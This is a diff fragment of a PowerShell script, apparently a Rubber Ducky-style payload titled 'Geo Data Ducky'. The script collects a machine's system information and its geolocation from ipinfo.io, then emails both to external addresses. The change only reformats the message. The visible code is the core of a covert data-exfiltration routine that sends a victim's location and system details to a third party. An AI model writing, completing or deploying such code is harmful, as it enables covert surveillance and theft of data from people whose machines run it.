@@ -26,7 +26,7 @@ Try {
 	$SystemInfoJson = $SystemInfo | ConvertTo-Json -Depth 10
 	$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
 	$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
-	$Message = $jsonContent+$SystemInfoJson
+	$Message = "Geolocation Data:`r`n$jsonContent`r`n`r`nSystem Information:`r`n$SystemInfoJson"
 	$EmailFrom = "usulmadhi@outlook.fr"
 	$EmailTo = "UsulMadhi@proton.me"
 	$Subject = "Geo Data Ducky"
